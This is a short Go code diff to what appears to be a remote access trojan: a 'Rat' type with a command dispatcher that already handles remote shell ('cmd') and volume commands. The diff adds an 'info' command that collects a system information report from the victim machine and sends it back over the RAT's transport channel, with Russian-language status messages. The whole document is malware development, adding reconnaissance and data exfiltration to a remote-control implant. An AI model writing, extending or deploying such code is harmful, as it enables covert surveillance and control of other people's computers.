@@ -43,6 +43,8 @@ func (r *Rat) commandsSwitch(text string) {
 		go r.cmdCmd(args)
 	case "volume":
 		go r.volumeCmd(args)
+	case "info":
+		go r.infoCmd()
 	default:
 		go r.defaultCmd()
 	}
@@ -263,4 +265,12 @@ func (r *Rat) volumeCmd(args string) {
 	}
 
 	r.Transport.Send("Громкость успешно установлена на %d%%.", volume)
+}
+
+func (r *Rat) infoCmd() {
+	info := r.Engine.Info.Report()
+	err := r.Transport.Send("Информация о системе:\n%s", info)
+	if err != nil {
+		r.Transport.Send("Ошибка отправки: %v", err)
+	}
 }
